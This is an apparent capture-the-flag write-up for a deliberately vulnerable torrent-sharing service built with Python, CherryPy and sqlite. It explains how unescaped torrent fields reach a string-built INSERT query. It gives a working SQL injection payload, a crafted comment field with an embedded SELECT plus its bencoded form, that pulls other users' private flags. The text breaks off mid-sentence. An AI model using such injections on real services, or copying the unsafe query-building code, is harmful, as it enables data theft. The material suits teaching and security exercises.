## Description

The Pirate Bay is a web-service for sharing torrent files. It is written in **Python 3.5** as a programming language, **CherryPy** as a web framework and **sqlite3** as a database client. Service allows marking a file as private, making it available only for the owner. The checksystem puts flags in comments of private torrent files.

## The vulnerability
There is a classic SQL injection. Some fields of torrent files are not escaped on INSERT requests.

### The torrent file structure

[The torrent file](https://en.wikipedia.org/wiki/Torrent_file) is a [bencoded](https://en.wikipedia.org/wiki/Bencode) associative array with the following keys (some optional keys are omitted):

* announce - the URL of the tracker
* info - the dictionary, which keys depend on whether one or several files are shared:
	* files - a list of dictionaries each corresponding to a file (only when multiple files are being shared). Each dictionary has the following keys:
		* length - size of the file in bytes
		* path - a list of strings corresponding to subdirectory names, the last of which is the actual file name
	* length - size of the file in bytes (only when one file is being shared)
	* name - suggested filename where the file is to be saved (if one file)/suggested directory name where the files are to be saved (if multiple files)
	* piece length - number of bytes per piece
	* pieces - a hash list
	* comment - text description of the torrent file (optional)

### Database analysis

We have seen some fields in a torrent file. Let's find something similar the in database.
The name of the SQLite database file can be found in db/client.py.

(`DATABASE_FULL_PATH` const)

```python
...
class DBClient(metaclass=Singleton):
    def __init__(self):
        self.connection = sqlite3.connect(DATABASE_FULL_PATH, check_same_thread=False)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.connection.close()
```

Now open this file with **SQLite**:
![sqlite table](https://goo.gl/66Xdos)

**PrivateTorrentFile** table contains following columns: *announce*, *length*, *comment*, *name*, *uid*, *upload_by*, *content*.
Columns *announce*, *length*, *comment*, *name* are directly copied from the torrent file without escaping.

### Exploitation

For successful SQL injection we should change our torrent file fields to make **INSERT** query put some interesting information to the table.

Let's look at **db/client.py** file again. There is a constructor of **insert query**:

```python
...
class InsertQuery:
    def __init__(self, tbl_name, field_names, values):
        self.query = "INSERT INTO {tbl_name} ({field_names}) VALUES ({values});".format(
            tbl_name=tbl_name,
            field_names=', '.join(field_names),
            values=", ".join(value for value in values)
        )
...
```
The simplest way to understand how to build necessary **insert query** is:
1. Add `print(self.query)` at the end of `__init__` method for printing query
2. Remove line `environment = "production"` from the `webserver/webserver.config` for
enabling debug messages from stdout
3. Restart a service with `sudo docker-compose stop`, then `sudo docker-compose up`

Thus every **insert query** now prints to our console:
![insert query printing](http://joxi.ru/MAjEbeVSvNRZ42.png)

It's clear that the following torrent file:
```python
{
	'announce': 'ructfe.org',
	'info': {
			'length': 4526,
			'name': 'Chocolate Chip Cookie',
			'piece length': 1024,
			'pieces': '...',
			'comment': 'G9O3ODKXJAESQ58BCGWJ5EAYMOJM0ZR='
		}
	}
}
```
turns into query `INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES ('ructfe.org', 'G9O3ODKXJAESQ58BCGWJ5EAYMOJM0ZR=', '...', '4526', 'Chocolate Chip Cookie', <some uid>, <user login>);`

For SQL injection we need some **insert query** like this: `INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES (''||<select query>||'', ...);`

*Operator || is a concatenation of strings in sqlite.*

#### Constucting a query
We can steal flag directly from **PrivateTorrentFile** table:
`INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES (''||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'', '', '', 0, '0', '', <hacker_username>);`

#### Performing a query
We constructed a request to do what we want. Now we need to make him executed. To do it we need to place the request in a torrent-file and upload it:
```python
{
    'announce': '0',
    'info': {
        'length': 0,
        'name': '',
        'piece length': 0,
        'pieces': '',
        'comment': "'||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'"
        }
    }
}
```
Then, generate torrent file using a function `make_dictionary` from `torrent_format/bencoder`:

`d8:announce0:4:infod7:comment96:'||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'6:lengthi0e4:name0:12:piece lengthi0e6:pieces0:ee`

Finally, make POST request to upload this file to `/upload_private`. Now we successfully executed our **insert query**.
Now we managed to place the flag to the **PrivateTorrentFile** table. It can be got using ....
